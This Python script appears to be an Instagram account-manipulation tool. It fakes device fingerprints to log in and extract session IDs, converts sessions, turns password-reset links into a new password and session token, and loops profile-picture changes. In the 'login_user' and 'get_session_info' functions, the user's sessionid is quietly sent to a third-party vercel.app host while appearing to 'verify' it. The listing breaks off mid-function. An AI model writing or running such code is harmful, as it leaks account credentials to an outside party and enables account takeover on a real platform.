import requests,uuid,random,re,ctypes,json,urllib,hashlib,hmac,urllib.parse,base64,os,string
from time import sleep
import time
from io import BytesIO
from datetime import datetime

# Function for option 1: GET SESSION (CODE)
def get_session_code():
    print("Executing: GET SESSION (CODE)")
    
    timestamp = str(int(time.time()))

    def RandomStringUpper(n = 10):
        letters = string.ascii_uppercase + '1234567890'
        return ''.join(random.choice(letters) for i in range(n))
    def RandomString(n=10):
        letters = string.ascii_lowercase + '1234567890'
        return ''.join(random.choice(letters) for i in range(n))

    def RandomStringUpper(n=10):
        letters = string.ascii_uppercase + '1234567890'
        return ''.join(random.choice(letters) for i in range(n))

    def RandomStringChars(n=10):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(n))

    def randomStringWithChar(stringLength=10):
        letters = string.ascii_lowercase + '1234567890'
        result = ''.join(random.choice(letters) for i in range(stringLength - 1))
        return RandomStringChars(1) + result

    uu = '83f2000a-4b95-4811-bc8d-0f3539ef07cf'

    def generate_DeviceId(ID):
        volatile_ID = "12345"
        m = hashlib.md5()
        m.update(ID.encode('utf-8') + volatile_ID.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16]

    class sessting:
        def __init__(self):
            pass
        def headers_login(self):
            headers = {}
            headers['User-Agent'] = self.UserAgent
            headers['Host'] = 'i.instagram.com'
            headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            headers['accept-encoding'] = 'gzip, deflate'
            headers['x-fb-http-engine'] = 'Liger'
            headers['Connection'] = 'close'
            return headers
        def generateUSER_AGENT(self):
            Devices_menu = ['HUAWEI', 'Xiaomi', 'samsung', 'OnePlus']
            DPIs = [
                '480', '320', '640', '515', '120', '160', '240', '800'
            ]
            randResolution = random.randrange(2, 9) * 180
            lowerResolution = randResolution - 180
            DEVICE_SETTINTS = {
                'system': "Android",
                'Host': "Instagram",
                'manufacturer': f'{random.choice(Devices_menu)}',
                'model': f'{random.choice(Devices_menu)}-{randomStringWithChar(4).upper()}',
                'android_version': random.randint(18, 25),
                'android_release': f'{random.randint(1, 7)}.{random.randint(0, 7)}',
                "cpu": f"{RandomStringChars(2)}{random.randrange(1000, 9999)}",
                'resolution': f'{randResolution}x{lowerResolution}',
                'randomL': f"{RandomString(6)}",
                'dpi': f"{random.choice(DPIs)}"
            }
            return '{Host} 155.0.0.37.107 {system} ({android_version}/{android_release}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {cpu}; {randomL}; en_US)'.format(
                **DEVICE_SETTINTS)
        def generate_DeviceId(self , ID):
            volatile_ID = "12345"
            m = hashlib.md5()
            m.update(ID.encode('utf-8') + volatile_ID.encode('utf-8'))
            return 'android-' + m.hexdigest()[:16]
        
    class login:
        def __init__(self):
            self.sesstings = sessting()
            self.coo = None
            self.token = None
            self.mid = None
            self.DeviceID = None
            self.sessionid = None
            self.Login()
        
        def headers_login(self):
            headers = {}
            headers['User-Agent'] = self.sesstings.generateUSER_AGENT()
            headers['Host'] = 'i.instagram.com'
            headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            headers['accept-encoding'] = 'gzip, deflate'
            headers['x-fb-http-engine'] = 'Liger'
            headers['Connection'] = 'close'
            return headers
        
        def checkpoint(self):
            info = requests.get(f"https://i.instagram.com/api/v1{self.req.json()['challenge']['api_path']}", headers=self.headers_login(), cookies=self.coo)
            step_data = info.json()["step_data"]
            if "phone_number" in step_data:
                try:
                    phone = info.json()["step_data"]["phone_number"]
                    print(f'[0] phone_number : {phone}')
                except:
                    pass
            elif "email" in step_data:
                try:
                    email = info.json()["step_data"]["email"]
                    print(f'[1] email : {email}')
                except:
                    pass

            else:
                print("unknown verification method")
                input()
                exit()
            return self.send_choice()
        def send_choice(self):
            choice = input('choice : ')
            data = {}
            data['choice'] = str(choice)
            data['_uuid'] = uu
            data['_uid'] = uu
            data['_csrftoken'] = 'massing'
            challnge = self.req.json()['challenge']['api_path']
            self.send = requests.post(f"https://i.instagram.com/api/v1{challnge}",headers=self.headers_login(), data=data, cookies=self.coo)
            contact_point = self.send.json()["step_data"]["contact_point"]
            print(f'code sent to : {contact_point}')
            return self.get_code()
        def get_code(self):
            try:
                code = input("code : ")
                data = {}
                data['security_code'] = str(code),
                data['_uuid'] = uu,
                data['_uid'] = uu,
                data['_csrftoken'] = 'massing'
                path = self.req.json()['challenge']['api_path']
                send_code = requests.post(f"https://i.instagram.com/api/v1{path}", headers=self.headers_login(), data=data, cookies=self.coo)
                if "logged_in_user" in send_code.text:
                    print(f'Login Successfully as @{self.username}')
                    self.coo = send_code.cookies
                    self.token = self.coo.get("csrftoken")
                    self.mid = self.coo.get("mid")
                    self.sessionid = self.coo.get("sessionid")
                    print(self.sessionid)
                else:
                    regx_error = re.search(r'"message":"(.*?)",', send_code.text).group(1)
                    print(regx_error)
                    ask = input("Code is Not Work Do You Want Try Agin [Y/N] : ")
                    if ask.lower() == "y":
                        sleep(1)
                        return self.get_code()
                    else:
                        exit()
            except Exception as e:
                print(f"Error: {e}")
                return self.Login()
            
        def Login(self):
            self.username = input(f'UserName? : ')
            self.DeviceID = self.sesstings.generate_DeviceId(self.username)
            self.passwordd = input(f'Password? : ')
            data = {}
            data['guid'] = uu
            data['enc_password'] = f"#PWD_INSTAGRAM:0:{timestamp}:{self.passwordd}"
            data['username'] = self.username
            data['device_id'] = self.DeviceID
            data['login_attempt_count'] = '0'

            self.req = requests.post("https://i.instagram.com/api/v1/accounts/login/", headers=self.headers_login(), data=data)
            if "logged_in_user" in self.req.text:
                print(f'Login Successfully as @{self.username}')
                self.coo = self.req.cookies
                self.token = self.coo.get("csrftoken")
                self.mid = self.coo.get("mid")
                self.sessionid = self.coo.get("sessionid")
                print(f"session : {self.sessionid}")
            elif 'checkpoint_challenge_required' in self.req.text:
                self.coo = self.req.cookies
                self.token = self.coo.get("csrftoken")
                self.mid = self.coo.get("mid")
                self.sessionid = self.coo.get("sessionid")
                print("SCURE FOUND ")
                return self.checkpoint()
            else:
                try:
                    regx_error = re.search(r'"message":"(.*?)",', self.req.text).group(1)
                    print(regx_error)
                except:
                    print(self.req.text)
                ask = input("Something has gone wrong Do You Want Try Agin [Y/N] : ")
                if ask.lower() == "y":
                    sleep(1)
                    os.system("cls")
                    return self.Login()
                else:
                    input()
                    exit()

    login()



# Function for option 2: GET SESSION (ACCEPTIION)
def get_session_acception_code():
    print("Executing: GET SESSION (ACCEPTIION)")

    my_uuid = uuid.uuid4()
    my_uuid_str = str(my_uuid)
    modified_uuid_str = my_uuid_str[:8] + "should_trigger_override_login_success_action" + my_uuid_str[8:]
    rd = ''.join(random.choices(string.ascii_lowercase+string.digits, k=16))
    def login(user,password):
        data = {"params": "{\"client_input_params\":{\"contact_point\":\"" + user + "\",\"password\":\"#PWD_INSTAGRAM:0:0:" +  password + "\",\"fb_ig_device_id\":[],\"event_flow\":\"login_manual\",\"openid_tokens\":{},\"machine_id\":\"ZG93WAABAAEkJZWHLdW_Dm4nIE9C\",\"family_device_id\":\"\",\"accounts_list\":[],\"try_num\":1,\"login_attempt_count\":1,\"device_id\":\"android-" + rd + "\",\"auth_secure_device_id\":\"\",\"device_emails\":[],\"secure_family_device_id\":\"\",\"event_step\":\"home_page\"},\"server_params\":{\"is_platform_login\":0,\"qe_device_id\":\"\",\"family_device_id\":\"\",\"credential_type\":\"password\",\"waterfall_id\":\"" + modified_uuid_str + "\",\"username_text_input_id\":\"9cze54:46\",\"password_text_input_id\":\"9cze54:47\",\"offline_experiment_group\":\"caa_launch_ig4a_combined_60_percent\",\"INTERNAL__latency_qpl_instance_id\":56600226400306,\"INTERNAL_INFRA_THEME\":\"default\",\"device_id\":\"android-" + ''.join(random.choices(string.ascii_lowercase+string.digits, k=16)) + "\",\"server_login_source\":\"login\",\"login_source\":\"Login\",\"should_trigger_override_login_success_action\":0,\"ar_event_source\":\"login_home_page\",\"INTERNAL__latency_qpl_marker_id\":36707139}}"}
        data["params"] = data["params"].replace("\"family_device_id\":\"\"", "\"family_device_id\":\"" +my_uuid_str + "\"")
        data["params"] = data["params"].replace("\"qe_device_id\":\"\"", "\"qe_device_id\":\"" + my_uuid_str + "\"")
        headers = {"Host": "i.instagram.com","X-Ig-App-Locale": "ar_SA","X-Ig-Device-Locale": "ar_SA","X-Ig-Mapped-Locale": "ar_AR","X-Pigeon-Session-Id": f"UFS-{uuid.uuid4()}-0","X-Pigeon-Rawclienttime": "1685026670.130","X-Ig-Bandwidth-Speed-Kbps": "-1.000","X-Ig-Bandwidth-Totalbytes-B": "0","X-Ig-Bandwidth-Totaltime-Ms": "0","X-Bloks-Version-Id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb","X-Ig-Www-Claim": "0","X-Bloks-Is-Layout-Rtl": "true","X-Ig-Device-Id": f"{uuid.uuid4()}","X-Ig-Family-Device-Id": f"{uuid.uuid4()}","X-Ig-Android-Id": f"android-{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}","X-Ig-Timezone-Offset": "10800","X-Fb-Connection-Type": "WIFI","X-Ig-Connection-Type": "WIFI","X-Ig-Capabilities": "3brTv10=","X-Ig-App-Id": "567067343352427","Priority": "u=3","User-Agent": f"Instagram 303.0.0.0.59 Android (28/9; 320dpi; 900x1600; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; en_GB;)","Accept-Language": "ar-SA, en-US","Ig-Intended-User-Id": "0","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Content-Length": "1957","Accept-Encoding": "gzip, deflate","X-Fb-Http-Engine": "Liger","X-Fb-Client-Ip": "True","X-Fb-Server-Cluster": "True"}
        response = requests.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',headers=headers ,data=data)
        body = response.text
        if "Bearer" in body:
            session = re.search(r'Bearer IGT:2:(.*?),',response.text).group(1).strip()
            session = session[:-8]
            full=base64.b64decode(session).decode('utf-8')
            if "sessionid"  in full:
                sessionid = re.search(r'"sessionid":"(.*?)"}',full).group(1).strip()
                
            print(f"[ + ] Logged in with @{user}")
            print(f"[ + ] Session is : \n{sessionid}")
            input()
            exit()
        elif "The password you entered is incorrect" in body or "Please check your username and try again." in body or "inactive user" in body or "should_dismiss_loading\", \"has_identification_error\"" in body:
            print("[ - ] Bad Passowrd")
            input()
            exit()
        elif "challenge_required" in body or "two_step_verification" in body:
            print("[ ! ] Challenge requierd acccept and click enter ")
            input()
            login(user,password)
        else:
            print("[ ! ] Something wrong ")
            input()
            exit()
    USER = str(input("[ + ] Username : "))
    PASSW = str(input("[ + ] Password : "))
    login(USER,PASSW)



# Function for option 3: CONVARTE SESSION (WEB TO API)
def convert_session_web_to_api_code():
    print("Executing: CONVARTE SESSION (WEB TO API)")
    
    sessionID = input("SessionId:")
    auth_payload = '{"ds_user_id":"' + sessionID.split("%3A")[0] + '","sessionid":"' + sessionID + '"}'
    encoded_auth = base64.b64encode(auth_payload.encode('utf-8')).decode('utf-8')
    headers = {
        "User-Agent": "Instagram 365.0.0.14.102 Android (28/9; 300dpi; 1600x900; samsung; SM-N975F; SM-N975F; intel; en_US; 373310563)",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "cookie": f"sessionid={sessionID}",
        "X-Bloks-Version-Id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
        "X-Bloks-Is-Layout-Rtl": "false",
    }
    req = requests.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers=headers, cookies={"sessionid": sessionID})
    r = req.json()
    mid = req.headers.get("ig-set-x-mid")
    user = r["user"]["username"]
    print("[ DONE ] LOGGED: " + user)
    headers["X-Mid"] = mid
    print("[ DONE ] GET MID: " + mid)
    data = {}
    data['device_id'] = f"android-{''.join(random.choice('1234567890')for i in range(10))}"
    data['authorization_token'] = f"Bearer IGT:2:{encoded_auth}"
    req = requests.post("https://i.instagram.com/api/v1/accounts/continue_as_instagram_login/", headers=headers, data=data)
    if "logged" in req.text:
        print("[ DONE ] CONVERT !")
        sess = req.cookies.get("sessionid")
        if sess == None:
            after = str(base64.b64decode(req.headers.get('ig-set-authorization').split(":")[2]))
            sess = re.search('"sessionid":"(.*?)"',after).groups()[0]
        print("[ API ] Sessionid: " + sess)



# Function for option 4: CONVARTE SESSION (WEB TO API VIA MID)
def convert_session_web_to_api_via_mid_code():
    print("Executing: CONVARTE SESSION (WEB TO API VIA MID)")

    sessionID = input("SessionId: ")
    mid = input("Mid: ")

    auth_payload = '{"ds_user_id":"' + sessionID.split("%3A")[0] + '","sessionid":"' + sessionID + '"}'
    encoded_auth = base64.b64encode(auth_payload.encode('utf-8')).decode('utf-8')

    headers = {
        "User-Agent": "Instagram 237.0.0.14.102 Android",
        "X-Mid": mid,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "cookie": f"sessionid={sessionID}",
        "X-Bloks-Version-Id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
        "X-Bloks-Is-Layout-Rtl": "false",
    }

    data = {
        'device_id': f"android-{''.join(random.choice('1234567890') for _ in range(10))}",
        'authorization_token': f"Bearer IGT:2:{encoded_auth}"
    }

    req = requests.post("https://i.instagram.com/api/v1/accounts/continue_as_instagram_login/", headers=headers, data=data)

    if "logged" in req.text:
        print("Ok Good")
        sess = req.cookies.get("sessionid")

        if not sess:
            auth_header = req.headers.get('ig-set-authorization')
            if auth_header:
                try:
                    after = base64.b64decode(auth_header.split(":")[2]).decode('utf-8')
                    sess_match = re.search('"sessionid":"(.*?)"', after)
                    if sess_match:
                        sess = sess_match.group(1)
                    else:
                        print("No sessionid found in the decoded response.")
                except (IndexError, ValueError, AttributeError) as e:
                    print(f"Error processing header: {e}")
            else:
                print("The header 'ig-set-authorization' is missing in the response..")

        if sess:
            print("Api SessionID: " + sess)
        else:
            print("Failed to extract SessionID.")
            print(req.text)
    else:
        print("login failed.")



# Function for option 5: ACCEPT TRMES
def accept_terms_code():
    print("Executing: ACCEPT TRMES")
    sessionid = input("SessionId: ")
    session = sessionid
    headers = {
        "accept": "/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "76",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": f'sessionid={session}',
        "origin": "https://www.instagram.com",
        "referer": "https://www.instagram.com/terms/unblock/?next=/api/v1/web/fxcal/ig_sso_users/",
        "sec-ch-prefers-color-scheme": "light",
        "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "viewport-width": "453",
        "x-asbd-id": "198387",
        "x-csrftoken": "m2kPFuLMBSGix4E8ZbRdIDyh0parUk5r",
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "hmac.AR2BpT3Q3cBoHtz_yRH8EvKCYkOb7loHvR4Jah_iP8s8BmTf",
        "x-instagram-ajax": "9080db6b6a51",
        "x-requested-with": "XMLHttpRequest",
    }
    data1 = "updates=%7B%22existing_user_intro_state%22%3A2%7D&current_screen_key=qp_intro"
    data2 = "updates=%7B%22tos_data_policy_consent_state%22%3A2%7D&current_screen_key=tos"
    response1 = requests.post("https://www.instagram.com/web/consent/update/", headers=headers, data=data1).text
    response2 = requests.post("https://www.instagram.com/web/consent/update/", headers=headers, data=data2).text
    if '{"screen_key":"finished","status":"ok"}' in response1 or '{"screen_key":"finished","status":"ok"}' in response2:
        print("Success: Terms of Service accepted!")
    else:
        print("Failure: Could not accept Terms of Service.")


# Function for option 6: REMOVING FORMER USERS (API SESSION ONLY)
def removing_former_users():
    def clear_console():
        os.system('cls' if os.name == 'nt' else 'clear')

    def generate_random_csrf():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

    def display_header():
        clear_console()
        print("=" * 60)
        print("[!] Before using this option u must remove your acc pfp")
        print("[!] Removing the former may take some time, do not rush.")
        print("=" * 60)
        print()

    def download_image(url):
        try:
            image_response = requests.get(url)
            if image_response.status_code != 200:
                return
            image_bytes = BytesIO(image_response.content)

            files = {
                "profile_pic": ("profile.jpg", image_bytes, "image/jpeg")
            }
            return files
        except:
            return None

    def change_profile_picture(sessionid, url_img):
        url = 'https://www.instagram.com/accounts/web_change_profile_picture/'

        csrf_token = generate_random_csrf()
        
        headers = {
            "User-Agent": "Mozilla/5.0",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/edit/",
            "X-CSRFToken": csrf_token,
            "Cookie": f"sessionid={sessionid}; csrftoken={csrf_token};"
        }

        try:
            response = requests.post(url, headers=headers, files=download_image(url_img))
            if response.status_code == 200 and response.json().get("status") == "ok":
                return True
            else:
                return False
        except:
            return False

    def login_user():
        display_header()
        sessionid = input("\nEnter your Instagram sessionid: ").strip()
        
        try:
            check = requests.get(f"https://instagram-eta-wheat.vercel.app/services?key=instagram-48i9-telegram-dsofjsf9d783rhyds&sessionid={sessionid}&choice=1&data=")
            response = check.json()
            if response.get("status") == "valid":
                print(f"\n[+] Logged in as: @{response.get('username')}")
                time.sleep(2)
                clear_console()
                return sessionid
            else:
                print("\n[!] Invalid sessionid. Login failed.")
                return None
        except Exception as e:
            print(f"\n[!] Error verifying sessionid: {e}")
            return None

    def change_profile_pictures(sessionid):
        pfp_urls = [
            'https://i.pinimg.com/550x/35/3f/c5/353fc517a4f4fac8d9ecfc734818e048.jpg',
            'https://i.pinimg.com/236x/c1/43/43/c1434392c4c11ac42b782e9397eb2b58.jpg',
            'https://i.pinimg.com/originals/0f/42/27/0f42279ce48796e63c920ba9aa0295a2.jpg',
            'https://i.pinimg.com/236x/bf/8d/0d/bf8d0d9df86c121ad4e9ed65b4bb92cb.jpg'
        ]
        change_count = 0
        error = 0
        display_header()
        while True:
            for url in pfp_urls:
                    success = change_profile_picture(sessionid, url)
                    if success:
                        change_count += 1
                        print(f"- Total changes: [{change_count}], Error: [{error}]     ", end='\r')
                    else:
                        error +=1
                    time.sleep(20)

    def main_removing():
        display_header()
        sessionid = login_user()
        if sessionid:
            change_profile_pictures(sessionid)
        else:
            print("\n[!] Exiting. Could not authenticate.")
            return

    main_removing()


# Function for option 7: RESET PW (INACTIVE & ACTIVE ACC)
def reset_password_code():
    print("Executing: RESET PW (INACTIVE & ACTIVE ACC)")
    
    INSTAGRAM_API = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"

    def random_id(prefix="android-"):
        return prefix + uuid.uuid4().hex[:16]

    def gen_headers():
        return {
            "host": "i.instagram.com",
            "x-ig-app-locale": "en_OM",
            "x-ig-device-locale": "en_OM",
            "x-ig-mapped-locale": "en_AR",
            "x-pigeon-session-id": f"UFS-{uuid.uuid4()}-1",
            "x-pigeon-rawclienttime": str(time.time()),
            "x-ig-bandwidth-speed-kbps": str(random.randint(300, 1000)) + ".000",
            "x-ig-bandwidth-totalbytes-b": str(random.randint(1_000_000, 5_000_000)),
            "x-ig-bandwidth-totaltime-ms": str(random.randint(3000, 10000)),
            "x-bloks-version-id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
            "x-ig-www-claim": "0",
            "x-bloks-is-layout-rtl": "true",
            "x-ig-device-id": str(uuid.uuid4()),
            "x-ig-family-device-id": str(uuid.uuid4()),
            "x-ig-android-id": random_id(),
            "x-ig-timezone-offset": "14400",
            "x-fb-connection-type": "WIFI",
            "x-ig-connection-type": "WIFI",
            "x-ig-capabilities": "3brTv10=",
            "x-ig-app-id": "567067343352427",
            "priority": "u=3",
            "user-agent": "Instagram 275.0.0.27.98 Android (29/10; 443dpi; 1080x2224; HUAWEI; STK-L21; HWSTK-HF; kirin710; ar_OM; 458229237)",
            "accept-language": "en-OM, en-US",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept-encoding": "zstd, gzip, deflate",
            "x-fb-http-engine": "Liger",
            "ig-intended-user-id": "0",
        }

    def send_recovery(email_or_username):
        if not email_or_username:
            return {"error": "Missing email_or_username"}

        body_json = {
            "adid": str(uuid.uuid4()),
            "guid": str(uuid.uuid4()),
            "device_id": random_id(),
            "query": email_or_username,
            "waterfall_id": str(uuid.uuid4())
        }

        signed_body = "SIGNATURE." + json.dumps(body_json, separators=(",", ":"))
        data = {"signed_body": signed_body}

        headers = gen_headers()

        try:
            r = requests.post(INSTAGRAM_API, headers=headers, data=data)
            return {"status": r.status_code, "response": r.text.replace('\\','')}
        except Exception as e:
            return {"error": str(e)}

    print("Instagram Recovery Tool | By 92 \n")
    user = input("put ur username : ")
    result = send_recovery(user)
    print(json.dumps(result, indent=4, ensure_ascii=False))


# Function for option 8: CHANGE BIO (API SESSION ONLY)
def change_bio_code():
    print("Executing: CHANGE BIO (API SESSION ONLY)")
    
    def update_bio(Sessionid, Bio):
        try:
            auth_payload = '{"ds_user_id":"' + Sessionid.split("%3A")[0] + '","sessionid":"' + Sessionid + '"}'
            encoded_auth = base64.b64encode(auth_payload.encode('utf-8')).decode('utf-8')
            headers = {}
            headers['User-Agent'] =  "Instagram 237.0.0.14.102 Android (28/9; 300dpi; 1600x900; samsung; SM-N975F; SM-N975F; intel; en_US; 373310563)"
            headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            headers["Authorization"] = f"Bearer IGT:2:{encoded_auth}"
            req = requests.request("POST", "https://i.instagram.com/api/v1/accounts/set_biography/", headers=headers, data="raw_text=" + Bio)
            if '"ok"' in req.text:
                return True
            else:
                return False
        except Exception as e:
            print(f"Error: {e}")
            return False

    sessionid = input("Enter API Session ID: ").strip()
    bio_text = input("Enter new bio text: ").strip()
    
    if update_bio(sessionid, bio_text):
        print("✅ Bio changed successfully!")
    else:
        print("❌ Failed to change bio")



def reset_link():
    def generate_random_android_id():
        return f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"

    def generate_random_device_id():
        return str(uuid.uuid4())

    def generate_random_user_agent():
        android_versions = ["28/9", "29/10", "30/11", "31/12"]
        dpi_options = ["240dpi", "320dpi", "480dpi"]
        resolutions = ["720x1280", "1080x1920", "1440x2560"]
        brands = ["samsung", "xiaomi", "huawei", "oneplus", "google"]
        models = ["SM-G975F", "Mi-9T", "P30-Pro", "ONEPLUS-A6003", "Pixel-4"]
        version = random.choice(android_versions)
        dpi = random.choice(dpi_options)
        resolution = random.choice(resolutions)
        brand = random.choice(brands)
        model = random.choice(models)
        code = random.randint(100000000, 999999999)
        return f"Instagram 394.0.0.46.81 Android ({version}; {dpi}; {resolution}; {brand}; {model}; {model}; intel; en_US; {code})"


    def generate_password():
        timestamp = int(datetime.now().timestamp())
        nums = ''.join([str(random.randint(1, 100)) for _ in range(10)])
        password = f"suul@{nums}"
        return f"#PWD_INSTAGRAM:0:{timestamp}:{password}"

    def generate_headers(mid):
        return {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","X-Mid": mid,"User-Agent": USER_AGENT,"Content-Length": "9481"}

    def get_session_info(session_id):
        re = requests.get(f"https://instagram-eta-wheat.vercel.app/services?key=instagram-48i9-telegram-dsofjsf9d783rhyds&sessionid={session_id}&choice=17&data=")
        if not "Error" in re.text:
            if re.json()["status"] == "success":
                return re.json()["info"]
        return False

    ANDROID_ID = generate_random_android_id()
    USER_AGENT = generate_random_user_agent()
    WATERFALL_ID = generate_random_device_id()
    PASSWORD = generate_password()

    def change_password(challenge_context, cni, mid):
        url = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data = {"is_caa": "False","source": "","uidb36": "","error_state": {"type_name":"str","index":0,"state_id":1048583541},"afv": "","cni": str(cni),"token": "","has_follow_up_screens": "0","bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},"challenge_context": challenge_context,"bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","enc_new_password1": PASSWORD,"enc_new_password2": PASSWORD}    #By@48i9
        response = requests.post(url, headers=generate_headers(mid), data=data)
        if 'fbid_v2' in response.text:
            try:
                ig_set_authorization = response.headers.get('ig-set-authorization')
                token = ig_set_authorization.split('Bearer IGT:2:')[1]
                decoded_bytes = base64.b64decode(token)
                sessionid = decoded_bytes.decode('utf-8').split(',"sessionid":"')[1].split('"')[0]
                username = response.text.replace('\\', '').split('"username": "')[1].split('",')[0]
                info = get_session_info(sessionid)
                print("[+] Sessionid: "+sessionid)
                print("[+] Token: "+token)
                print("[+] Password: "+PASSWORD)
                print("[+] Username: "+username)
                if info:
                    for keyy, value in info.items():
                        print(f"[+] {keyy.upper()}: {value}")
            except:
                print('[-] BAD1')
                print(response.text)
        else:
            print('[-] BAD')
            print(response.text)

    def post2(data):
        url = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        dataa = {"user_id": str(data.get("user_id")),"cni": str(data.get("cni")),"nonce_code": str(data.get("nonce_code")),"bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',"challenge_context": str(data.get("challenge_context")),"bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","get_challenge": "true"}    #By@48i9
        response = requests.post(url, headers=generate_headers(data["X-Mid"]), data=dataa).text
        if str(data.get("cni")) in response:
            response = response.replace('\\', '')
            challenge_context = response.split(f'(bk.action.i64.Const, {data.get("cni")}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
            return challenge_context
        else:return False
        
    def get_get_challenge(link):
        uidb36 = link.split("https://instagram.com/accounts/password/reset/confirm/?uidb36=")[1].split("&token=")[0]
        token = link.split(f"&token=")[1].split(":")[0]
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {"source": "one_click_login_email","uidb36": uidb36,"device_id": ANDROID_ID, "token": token, "waterfall_id": WATERFALL_ID  }
        response = requests.post(url, headers=generate_headers(""), data=data)
        ig_set_x_mid = response.headers.get("Ig-Set-X-Mid")
        json_response = response.json()
        json_response["X-Mid"] = ig_set_x_mid
        if 'user_id' in response.text:return json_response
        else:return {"error": response.text, "status_code": response.status_code}

    data = (get_get_challenge(input("[+] Enter reset link: ")))
    t = post2(data)
    if t:
        change_password(t, data.get("cni"), data.get("X-Mid"))


# Function for option 10: SKIPPING DISMISS
def skipping_dismiss_code():
    print("Executing: SKIPPING DISMISS")
    
    sessionid = input("Sessionid: ")
    auth_payload = '{"ds_user_id":"' + sessionid.split("%3A")[0] + '","sessionid":"' + sessionid + '"}'
    encoded_auth = base64.b64encode(auth_payload.encode('utf-8')).decode('utf-8')
    headers = {
        "User-Agent": "Instagram 295.0.0.0.36 Android (25/7.1.2; 320dpi; 900x1600; samsung; SM-G955N; dream2lteks; samsungexynox8895; en_US; 499586693)",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "cookie": f"sessionid={sessionid}",
        "Authorization": f"Bearer IGT:2:{encoded_auth}",
        "X-Ig-App-Locale": "en_US",
        "X-Ig-Device-Locale": "en_US",
        "X-Ig-Mapped-Locale": "en_US",
        "X-Pigeon-Session-Id": "UFS-ac8724b2-4fe9-42ac-a47c-9a08f0ec51d4-0",
        "X-Pigeon-Rawclienttime": "1689682437.583",
        "X-Ig-Bandwidth-Speed-Kbps": "17585.000",
        "X-Ig-Bandwidth-Totalbytes-B": "11739493",
        "X-Ig-Bandwidth-Totaltime-Ms": "0",
        "X-Bloks-Version-Id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
        "X-Ig-Www-Claim": "hmac.AR1HYidj0VZt3cEDHC_CDLJm9Zil8u1vS2gb0Mgb7b4Gn4Qx",
        "X-Bloks-Is-Layout-Rtl": "false",
        "X-Ig-Device-Id": "3bc694b1-e663-4689-af50-c57ae12342d7",
        "X-Ig-Family-Device-Id": "48dc9c78-bd01-4deb-8a7f-ea77f8a9c173",
        "X-Ig-Android-Id": "android-6b9bd681ae255c63",
        "X-Ig-Timezone-Offset": "28800",
        "X-Ig-Nav-Chain": "SelfFragment:self_profile:14:main_profile:1689682239.541::,ProfileMediaTabFragment:self_profile:15:button:1689682239.979::,EditProfileFragment:edit_profile:16:button:1689682250.31::,ProfileMediaTabFragment:self_profile:20:button:1689682334.434::,EditProfileFragment:edit_profile:21:button:1689682342.179::,ProfileMediaTabFragment:self_profile:23:button:1689682409.62::,ProfileMenuFragment:bottom_sheet_profile:24:button:1689682410.206::,ProfileMediaTabFragment:self_profile:25:button:1689682413.169::,ProfileMenuFragment:bottom_sheet_profile:26:button:1689682413.354::,com.instagram.portable_settings.settings:com.instagram.portable_settings.settings:27:button:1689682414.763::",
        "X-Fb-Connection-Type": "WIFI",
        "X-Ig-Connection-Type": "WIFI",
        "X-Ig-Capabilities": "3brTv10=",
        "X-Ig-App-Id": "567067343352427",
        "Priority": "u=3",
        "Accept-Language": "en-US",
        "X-Fb-Http-Engine": "Liger",
        "X-Fb-Client-Ip": "True",
        "X-Fb-Server-Cluster": "True"
    }
